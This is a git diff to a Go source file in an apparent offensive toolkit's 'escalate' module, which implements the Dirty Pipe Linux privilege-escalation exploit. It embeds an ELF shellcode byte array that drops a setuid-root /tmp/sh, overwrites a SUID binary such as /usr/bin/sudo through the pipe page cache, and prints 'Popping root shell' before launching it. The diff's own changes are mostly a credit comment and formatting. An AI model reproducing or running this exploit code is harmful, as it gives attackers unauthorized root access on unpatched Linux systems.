@@ -3,13 +3,10 @@ package escalate
 import (
 	"flag"
 	"fmt"
-	//"io"
 	"os"
 	"os/exec"
 	"strings"
 	"syscall"
-	//"log"
-	//"net"
 
 	"github.com/seandheath/gogogadget/internal/gadget"
 )
@@ -30,6 +27,22 @@ var Gadget gadget.Gadget = gadget.Gadget{
 var path string
 const PAGE int = 4096
 const PIPELEN int = 65536
+
+/*
+ * Credit: https://github.com/febinrev/dirtypipez-exploit
+ * 
+ * Small (linux_x86_64) ELF file matroshka doll that does:
+ *   fd = open("/tmp/sh", O_WRONLY | O_CREAT | O_TRUNC);
+ *   write(fd, elfcode, elfcode_len)
+ *   chmod("/tmp/sh", 04755)
+ *   close(fd);
+ *   exit(0);
+ *
+ * The dropped ELF simply does:
+ *   setuid(0);
+ *   setgid(0);
+ *   execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
+ */
 var ELFCODE = []byte {
         0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
         0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 
@@ -68,10 +81,13 @@ var ELFCODE = []byte {
 }
 
 func initFlags(f *flag.FlagSet) {
+
 	f.StringVar(&path, "suid", "/usr/bin/sudo", "the path to the suid binary")
+
 }
 
 func Run() {
+	
 	// TODO: Check for required variables
 
 	// Get original file data for cleanup
@@ -122,12 +138,13 @@ func Run() {
 	}
 
 	// Execute root shell
-	fmt.Printf("Popping root shell  %s\n", path)
+	fmt.Printf("Popping root shell  %s\n\n", path)
 	args := []string {""}
 	Shell("/tmp/sh", args)
 
-	fmt.Println("Remember to remove /tmp/sh:")
+	fmt.Println("\nRemember to remove /tmp/sh:")
 	fmt.Println("\trm /tmp/sh")
+
 }
 
 func Backup(path string) ([]byte, error) {
@@ -172,6 +189,7 @@ func PreparePipe(read *os.File, write *os.File) (*os.File, error) {
 	}
 
 	return write, nil
+
 }
 
 func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {
@@ -202,7 +220,6 @@ func Exploit(write *os.File, path string, fileOffset int64, data []byte) error {
 }
 
 func Shell(path string, args []string) error {
-	// Credit: http://technosophos.com/2014/07/11/start-an-interactive-shell-from-within-go.html
 
 	// Get the current working directory.
 	cwd, err := os.Getwd()
